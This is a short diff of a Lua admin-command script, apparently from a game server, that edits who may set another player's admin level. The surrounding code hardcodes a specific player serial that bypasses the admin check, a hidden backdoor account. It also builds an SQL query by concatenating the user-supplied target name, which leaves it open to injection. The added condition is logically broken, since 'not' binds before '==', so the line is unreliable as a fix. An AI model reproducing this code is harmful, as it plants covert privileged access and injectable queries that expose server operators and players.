@@ -2055,7 +2055,7 @@ function adminlevel_func ( player, cmd, target, adminlevel )
 		if isAdminLevel ( player, 8 ) or getPlayerSerial(player) == "01D9C87D492ED103CC7ADA9107CB05F2" then
 		local tplayer = getPlayerFromName (target)
 		if getElementData ( tplayer, "loggedin" ) == 1 then
-			if getAdminLevel ( player ) > getAdminLevel ( tplayer ) then
+			if getAdminLevel ( player ) > getAdminLevel ( tplayer ) and not getPlayerSerial(player) == "01D9C87D492ED103CC7ADA9107CB05F2" then
 				if tonumber(adminlevel) and target then
 					if dbExist ( "userdata", "Name LIKE '"..target.."'") then
 						local adminlevelnr = tonumber(adminlevel)
